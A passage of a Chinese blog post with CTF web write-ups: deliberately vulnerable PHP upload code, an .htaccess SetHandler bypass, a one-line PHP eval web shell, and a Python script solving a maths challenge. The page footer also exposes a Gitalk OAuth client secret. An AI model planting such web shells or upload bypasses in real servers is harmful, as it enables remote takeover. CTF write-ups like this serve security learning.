+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+
+<span class="token prolog">&lt;?php
+error_reporting(0);
+class Uploader{
+    public $Filename;
+    public $cmd;
+    public $token;
+
+
+    function __construct(){
+        $sandbox = getcwd()."/uploads/".md5($_SESSION['user'])."/";
+        $ext = ".txt";
+        @mkdir($sandbox, 0777, true);
+        if(isset($_GET['name']) and !preg_match("/data:\/\/ | filter:\/\/ | php:\/\/ | \./i", $_GET['name'])){
+            $this->Filename = $_GET['name'];
+        }
+        else{
+            $this->Filename = $sandbox.$_SESSION['user'].$ext;
+        }
+
+        $this->cmd = "echo '&lt;br>&lt;br>Master, I want to study rizhan!&lt;br>&lt;br>';";
+        $this->token = $_SESSION['user'];
+    }
+
+    function upload($file){
+        global $sandbox;
+        global $ext;
+
+        if(preg_match("[^a-z0-9]", $this->Filename)){
+            $this->cmd = "die('illegal filename!');";
+        }
+        else{
+            if($file['size'] > 1024){
+                $this->cmd = "die('you are too big (′▽`〃)');";
+            }
+            else{
+                $this->cmd = "move_uploaded_file('".$file['tmp_name']."', '" . $this->Filename . "');";
+            }
+        }
+    }
+
+    function __toString(){
+        global $sandbox;
+        global $ext;
+        // return $sandbox.$this->Filename.$ext;
+        return $this->Filename;
+    }
+
+    function __destruct(){
+        if($this->token != $_SESSION['user']){
+            $this->cmd = "die('check token falied!');";
+        }
+        eval($this->cmd);
+    }
+}
+
+if(isset($_FILES['file'])) {
+    $uploader = new Uploader();
+    $uploader->upload($_FILES["file"]);
+    if(@file_get_contents($uploader)){
+        echo "下面是你上传的文件：&lt;br>".$uploader."&lt;br>";
+        echo file_get_contents($uploader);
+    }
+}
+
+?></span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>开始审计代码，仔细看Uploader类的构造函数。发现正则表达式写的有问题（），上传得到的文件名完全可控。直接上传php文件。就getshell了？？？flag拿的一脸懵逼。<br><img src="https://s2.ax1x.com/2020/01/24/1ZEkaF.png" alt="1ZEkaF.png"><br>正常做法应该是上传phar文件，进行反序列化执行命令。这里就不再具体写了。</p>
+<h2 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h2><p> 解题思路<br>上传.htaccess</p>
+<pre class="line-numbers language-html"><code class="language-html">SetHandler application/x-httpd-php
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>然后上传1.png,然后burp发包去不断请求,然后蚁剑链接shell查看根目录拿到shell</p>
+<p><code>&lt;script language=&quot;php&quot;&gt;echo md5(123);eval($_POST[&#39;a&#39;]);&lt;/script&gt;</code></p>
+<h3 id="StrongestMind"><a href="#StrongestMind" class="headerlink" title="StrongestMind"></a>StrongestMind</h3><p>知识点：<strong>编程</strong><br>我的垃圾脚本：</p>
+<pre class="line-numbers language-html"><code class="language-html">#coding=utf-8
+from requests import *
+import re
+import time
+
+
+s = session()
+a = s.get("http://46303d3c-2a4f-4ecc-9fbc-d047453ec7cb.node3.buuoj.cn/index.php")
+for i in range(10000):
+    pattern = re.findall(r'\d+.[+-].\d+', a.text)
+    print pattern
+    if pattern==[]:
+        time.sleep(2)
+        a = s.post("http://46303d3c-2a4f-4ecc-9fbc-d047453ec7cb.node3.buuoj.cn/index.php", data = {"answer" : c})
+        pattern = re.findall(r'\d+.[+-].\d+', a.text)
+    print pattern
+    c = eval(pattern[0])
+    a = s.post("http://46303d3c-2a4f-4ecc-9fbc-d047453ec7cb.node3.buuoj.cn/index.php", data = {"answer" : c})
+    if 'flag{' in a.text:
+        print a.text
+        exit()
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个学期的ctf生涯算是差不多结束了。虽然没有啥好的成绩，但是我能感觉的到，自己有一定的进步。虽然自己还是很菜，但是我相信只要我继续努力，一定会越来越强。定个小目标。寒假在没有网络安全工作的情况下，看一本关于网络基础知识的书。。。（恶补基础-_-）。加油，奥里给！！！</p>
+	
+	</div>
+	
+	<div id="current-post-cover" data-scr="/images/post-cover/37.jpg"></div>
+
+	<!-- relate post, comment...-->
+	<div class="investment-container">
+		<div class="investment-header">
+			<div class="investment-title-1">
+				<div class="on">相关文章</div>
+				<div>评论</div>
+			</div>
+			<div class="investment-title-2">	            
+				
+	<span>
+		<a href="javascript: window.scrollTo(0, 0);">返回顶部</a>
+		
+			<a href="/2019/12/02/计算机组成原理学习/" title="计算机组成原理学习" rel="prev">
+				&laquo;上一篇
+			</a>
+		
+		
+			<a href="/2019/11/20/bypass-disfunction/" title="bypass disfunction" rel="next">
+				下一篇&raquo;
+			</a>
+			
+	</span>
+      		
+			</div>	
+		</div>
+		
+		<div class="investment-content">
+			<div class="investment-content-list">
+				
+
+<div class="relate-post">
+	<ul>
+		
+				<li>
+					<div>
+						<a href="/2020/02/24/i春秋2020新春战“疫”网络安全公益赛-web-Writeup/" title="i春秋2020新春战“疫”网络安全公益赛 web Writeup">
+							i春秋2020新春战“疫”网络安全公益赛 web Writeup
+						</a>
+						<p>
+							前言这次比赛题目质量挺好的，除啦环境可能有时候有点问题。（就让我遇到了。心态炸了一天。。。）其他都挺好的。
+DAY1简单的招聘系统知识点：sql注入的联合注入或盲注存在注册和登陆功能，首先进行注册后登陆进系统，发现有一个模块是管理员才...
+						</p>
+					</div>
+
+					<a href="/2020/02/24/i春秋2020新春战“疫”网络安全公益赛-web-Writeup/" title="i春秋2020新春战“疫”网络安全公益赛 web Writeup">				
+						<img src="/images/post-cover/6.jpg" class="relateImg" alt="i春秋2020新春战“疫”网络安全公益赛 web Writeup">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/11/20/2019极客大挑战RCE-ME/" title="2019极客大挑战RCE ME">
+							2019极客大挑战RCE ME
+						</a>
+						<p>
+							题目环境：http://114.116.44.23:40001/
+题目还是老样子。无字母数字rce。知识点其实都有写过，就不说了。详细参见：【RCE提高篇】题目源码：
+&lt;?php
+ini_set("display_errors"...
+						</p>
+					</div>
+
+					<a href="/2019/11/20/2019极客大挑战RCE-ME/" title="2019极客大挑战RCE ME">				
+						<img src="/images/post-cover/32.jpg" class="relateImg" alt="2019极客大挑战RCE ME">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/10/16/buuctf刷题记录-序/" title="buuctf刷题记录(序)">
+							buuctf刷题记录(序)
+						</a>
+						<p>
+							love math知识点：代码审计，绕waf直接给出源码：
+&lt;?php
+error_reporting(0);
+//听说你很喜欢数学，不知道你是否爱它胜过爱flag
+if(!isset($_GET['c'])){
+    sho...
+						</p>
+					</div>
+
+					<a href="/2019/10/16/buuctf刷题记录-序/" title="buuctf刷题记录(序)">				
+						<img src="/images/post-cover/33.jpg" class="relateImg" alt="buuctf刷题记录(序)">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/09/07/buuctf刷题记录/" title="buuctf刷题记录">
+							buuctf刷题记录
+						</a>
+						<p>
+							前言最近感觉自己菜出来新境界。。。刷点题来证明我还存在。。。言归正传。开刷
+hack world知识点：sql布尔盲注，bypass进入题目，发现这是典型的sql布尔盲注，题目给出了表名和列名都是flag，用burp进行fuzz测试发...
+						</p>
+					</div>
+
+					<a href="/2019/09/07/buuctf刷题记录/" title="buuctf刷题记录">				
+						<img src="/images/post-cover/31.jpg" class="relateImg" alt="buuctf刷题记录">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/09/04/OGeek-CTF-2019-Enjoy-You-Self/" title="OGeek CTF 2019-Enjoy You Self">
+							OGeek CTF 2019-Enjoy You Self
+						</a>
+						<p>
+							前言最近ctf不少，但是成绩不咋样，菜的真实。新学期开始了，最后一年了。。。继续努力吧。OPPO OGeek CTF 2019咋说呢，菜。。。总结一下学到的东西吧。
+Enjoy You Self线上环境：http://47.107.2...
+						</p>
+					</div>
+
+					<a href="/2019/09/04/OGeek-CTF-2019-Enjoy-You-Self/" title="OGeek CTF 2019-Enjoy You Self">				
+						<img src="/images/post-cover/30.jpg" class="relateImg" alt="OGeek CTF 2019-Enjoy You Self">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/08/06/2018n1ctf-esay-php复现/" title="2018n1ctf-esay-php复现">
+							2018n1ctf-esay-php复现
+						</a>
+						<p>
+							前言最近做题，两次遇见这个题。第一次看着writeup都没复现成功。emm（菜的真实。。。）。这次自己搭的环境用三种方法来复现这个题。
+环境搭建官方给了环境，有dockerfile。所以比较容易搭建的。官方文件在docker上安装上d...
+						</p>
+					</div>
+
+					<a href="/2019/08/06/2018n1ctf-esay-php复现/" title="2018n1ctf-esay-php复现">				
+						<img src="/images/post-cover/29.jpg" class="relateImg" alt="2018n1ctf-esay-php复现">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/06/16/刷题记录/" title="刷题记录">
+							刷题记录
+						</a>
+						<p>
+							一步步慢慢绕题目：
+&lt;?php
+show_source(__FILE__);
+$v1=0;$v2=0;$v3=0;
+$a=(array)json_decode(@$_GET['foo']);
+if(is_array($a)){
+...
+						</p>
+					</div>
+
+					<a href="/2019/06/16/刷题记录/" title="刷题记录">				
+						<img src="/images/post-cover/38.jpg" class="relateImg" alt="刷题记录">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/06/13/sql注入新姿势-2019强网杯/" title="sql注入新姿势-2019强网杯">
+							sql注入新姿势-2019强网杯
+						</a>
+						<p>
+							前言woc前一段时间，写过一次，发现被我搞丢了，气死…重写ing
+随便注首先，对题目进行测试尝试一下1&#39;发现会得到报错，尝试一下万能密码1&#39; or &#39;1&#39;=&#39;1，发现能够把当前表所有的值全部输出...
+						</p>
+					</div>
+
+					<a href="/2019/06/13/sql注入新姿势-2019强网杯/" title="sql注入新姿势-2019强网杯">				
+						<img src="/images/post-cover/30.jpg" class="relateImg" alt="sql注入新姿势-2019强网杯">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/06/05/ciscn线下部分题解/" title="ciscn线下部分题解">
+							ciscn线下部分题解
+						</a>
+						<p>
+							前言ciscn华中赛区线下赛让我认识到自己是真的菜。。。总结一下这次比赛吧。
+web1 &lt;?php
+// ini_set("display_errors", "On"); 
+// error_reporting(E_ALL | ...
+						</p>
+					</div>
+
+					<a href="/2019/06/05/ciscn线下部分题解/" title="ciscn线下部分题解">				
+						<img src="/images/post-cover/36.jpg" class="relateImg" alt="ciscn线下部分题解">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/04/30/2019ddctfwriteup/" title="2019ddctfwriteup">
+							2019ddctfwriteup
+						</a>
+						<p>
+							web滴~这是i春秋上的一个原题。（原题比这个好）进入页面发现观察jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09像是个base64编码。进行解码。解码两次得到666C61672E6A7067。像是个base1...
+						</p>
+					</div>
+
+					<a href="/2019/04/30/2019ddctfwriteup/" title="2019ddctfwriteup">				
+						<img src="/images/post-cover/25.jpg" class="relateImg" alt="2019ddctfwriteup">
+					</a>
+				</li>											
+		
+		
+	</ul>
+</div>	
+			</div>
+			<div class="investment-content-list">
+				<div class="layout-comment">
+
+	
+
+		
+
+			<!-- comment gitalk -->
+			<!-- show gitalk comment -->
+<div id="gitalk-container"></div>
+
+<!-- gitalk`s css & js -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<link rel="stylesheet" href="/css/comment.css">
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+	//Thanks O-R
+	//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
+	//去除尾部匹配正则数组的字符串  
+	//Remove redundant characters
+	String.prototype.trimEnd = function(regStr) {
+		var result = this;
+		if(regStr == undefined || regStr == null || regStr == "") {
+			return result;
+		}
+		var array = regStr.split(',');
+
+		if(array.length > 0) {
+
+			var c = array.shift();
+			var str = this;
+			var i = str.length;
+			var rg = new RegExp(c);
+			var matchArr = str.match(rg);
+
+			if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
+				var matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
+					.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
+					.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
+					.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
+					.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
+					.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
+					.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
+					.replace(/\./g, "\\.").replace(/\&/g, "\\&");
+				matchStr = matchStr + '$';
+				result = str.replace(new RegExp(matchStr), "");
+			}
+
+			if(array.length > 0) {
+				return result.trimEnd(array.join())
+			} else {
+				return result;
+			}
+		}
+	};
+
+	//Create gitalk
+	var gitalk = new Gitalk({
+		clientID: 'b7a5e9f0853539dc3363',
+		clientSecret: '3cd61bd5dfe5ddffe1c91e4392ca95874aade540',
+		//id: window.location.pathname,
+		//id: decodeURI(window.location.pathname),
+		//id: (window.location.pathname).split("/").pop().substring(0, 49),
+		id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
+		repo: 'blog-Comment-Repo',
+		owner: 'ab-Alex',
+		admin: 'ab-Alex',
+		distractionFreeMode: 'true',
+	})
+	gitalk.render('gitalk-container');
+</script>
+
+		
+		
+	
+
+</div>
+			</div>
+		</div>	
+	</div>
+</div>
+
+
+
+	<!-- leancloud -->
+	<!--
+	时间：2018-11-27
+	描述：
+		文章访问量：visitors
+		文章喜欢量：likes	
+		文章排行榜：topNPost
+		其他得说明：
+			01-Cookie相关的函数 
+				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
+			02-visitors相关的函数 
+				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
+				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
+			03-topNPost相关的函数
+				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
+			04-likes相关的函数，
+				参考了01 & 02进行简单的设计与实现
+-->
+
+
+
+	<script>
+		var appid = 'dXz',
+            appkey = 'wzG';	  
+        AnnieLeancloud(appid, appkey);         
+	</script>
+    
+
+
+ 
+
+<!-- show math formula -->
+
+	<script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+	<script type="text/x-mathjax-config">
+		MathJax.Hub.Config(
+			{ 
+				tex2jax: {
+					inlineMath: [['$','$'], ['\\(','\\)']]
+				} 
+			}
+		);
+	</script>
+
+
+
+<script>
+	//Refer to https://xinyo.org/archives/66226, thanks xinyo!
+	function codeCopy() {
+		var copyContainerId = 'copy-nav';
+						
+		$("pre").before(" <nav class=' " + copyContainerId + " '><i class='code-language'></i></nav> ");
+		
+		$('.' + copyContainerId).append("<i class='fa fa-clipboard copy-btn' aria-hidden='true'></i>");
+		
+		$('#article-content').find('pre').each( function () {
+			var language = $(this).children('code').attr('class').substr(9);//why 9? Need to check language?
+			$(this).prev().find('.code-language').text( language );	
+		});
+				
+		//为复制按钮添加click事件
+		$('.copy-btn').on("click", function() {
+			//初始化
+			$("textarea").remove("#targetId");
+			
+			//获取对应的代码
+			var codePre = $(this).parent().next(),
+				codeText = codePre[0].textContent,
+				target = document.createElement("textarea");
+			target.style.position = "absolute";
+			target.style.left = "-9999px";
+			target.style.top = "0";
+			target.id = "targetId";
+			codePre.append(target);
+			target.textContent = codeText;
+
+			//选中textarea内的代码
+			target.focus();
+			target.setSelectionRange(0, target.value.length);
+
+			// 复制选中的内容
+			document.execCommand("copy");
+			
+			//删除添加的节点
+			$("textarea").remove("#targetId");
+			
+			var thisCopied = $(this);
+			thisCopied.addClass('copy-status');	
+			setTimeout( function() {
+				thisCopied.removeClass('copy-status');
+			}, 2000)
+		});	
+	}
+	
+	if( $('.layout-post').length )	{
+		codeCopy();
+	}
+</script>
+
+
+<!-- TODO: There seems to be a bug when you close the post gallery! -->
+<link rel="stylesheet" href="/plugin/lightgallery/css/lightgallery.css">
+<script src="/plugin/lightgallery/js/jquery-1.11.0.min.js"></script>
+<script src="/plugin/lightgallery/js/lightgallery-all.min.js"></script>
+
+<script type="text/javascript">
+	var postTitle = $('.article-title a').text() ? $('.article-title a').text() : "No post title!";
+	$('.article-content img').each(function() {
+		var imgPath = $(this).attr('src'),
+			imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
+		$(this).wrap('<div class="img-responsive" data-src="' + imgPath + '" data-responsive="' + imgPath + '" data-sub-html="<p>图片 ' + imgTitle + '</p><h4>文章' + postTitle + '</h4>"></div>');
+	});
+
+	$('.article-content').lightGallery({
+		mode: 'lg-slide',
+		selector: '.img-responsive',
+		share: false,
+		zoom: false,
+		download: false
+	});
+	//TODO：支持video
+</script>
+
+<!--
+	时间：2018-11-17
+	描述：
+		插件名称：katelog.min.js
+		插件作者：KELEN
+		插件来源: https://github.com/KELEN/katelog
+-->
+
+		
+
+		<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+		<script src="/plugin/toc/katelog.min.js"></script>
+
+		
+	
+		</main>
+		
+		<!--footer-->
+		<footer>
+	<div class="social">
+		<ul>
+	
+		
+			<li>
+				<a href="http://github.com/" title="Github" target="_blank">
+					<i class="fa fa-github"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="http://github.com/" title="Weibo" target="_blank">
+					<i class="fa fa-weibo"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="mailto:http://github.com/" title="Email" target="_blank">
+					<i class="fa fa-envelope-o"></i>
+				</a>
+			</li>
+		
+
+		
+			<li>
+				<a href="http://github.com/" title="QQ" target="_blank">
+					<i class="fa fa-qq"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="http://github.com/" title="Twitter" target="_blank">
+					<i class="fa fa-twitter"></i>
+				</a>
+			</li>
+		
+	 
+</ul>
+	</div>
+		
+	<div class="copyright">
+		<p>
+			 
+				&copy;2017 - 2020, content by Alex. All Rights Reserved.
+			
+			
+			
+
+	<!-- busuanzi -->
+	<!-- busuanzi -->
+
+		
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+
+		<span id="busuanzi_container_page_pv">
+	  		本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+		</span>
+
+	
+
+
+
+
+		</p>
+		<p>
+			<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay. 					
+		</p>
+	</div>		
+</footer>
+		
+    <!-- set '1' to show motto in all pages! -->
+
+	<script src="/js/motto.js"></script>
+	<script type="text/javascript">
+		$(".motto").html( getMingYanContent() );
+	</script>	
+
+
+
+
+    <!--
+	时间：2018-10-3
+	描述：
+		插件名称：hexo-generator-search-zip
+		插件来源: https://github.com/SuperKieran/hexo-generator-search-zip
+		代码参考：https://github.com/SuperKieran/TKL/blob/master/layout/_partial/search.ejs(Include: js & css)	
+-->
+<div class="popup search-popup local-search-popup">
+	<div class="local-search-container">
+		<span class="popup-btn-close">
+      ESC
+   </span>
+		<div class="local-search-header">
+			<input autocomplete="off" placeholder="Search..." type="text" id="local-search-input">
+		</div>
+		<div class="local-search-body">
+			<div id="local-search-output"></div>
+		</div>
+		<div class="local-search-footer">
+			
+
+   
+	<div id="topN"></div>
+	
+    <script>
+        var appid = 'dXz',
+            appkey = 'wzG',
+            limitCount = 10;
+        if( $('#topN').length ){
+            AV.initialize(appid, appkey);
+            var Counter = AV.Object.extend("Counter");  
+            topNPost(Counter, limitCount);
+        }
+    </script>
+   
+
+		</div>
+	</div>
+</div>
+
+<script src="/js/ziploader.js"></script>
+<script src="/js/search.js"></script>
+
+<script type="text/javascript">
+	var search_path = 'search.json',
+		zip_Path = '/search.zip',
+		version_Path = '/searchVersion.txt',
+		input_Trigger = 'auto',
+		top_N = '2';
+
+	themeLocalSearch({
+		search_path, 
+		zip_Path, 
+		version_Path, 
+		input_Trigger, 
+		top_N
+	});
+</script>
+
+
+
+    <script src="/js/love.js"></script>
+
+
+<!--back to top-->
+
+    
+	<div id="totop">
+  		<a href="javascript:;"  name="TOTOP" class="fa fa-arrow-up" ></a>
+	</div>
+	<div id="tobuttom">
+		<a href="javascript:;"  name="TOBUTTOM" class="fa fa-arrow-down" ></a>
+	</div>
+ 
+
+
+ 
+
+<script src="/js/vibrant.js"></script>
+<script src="/js/chinese.js"></script>
+<script src="/js/main.js"></script>
+	</body>
+	</html>
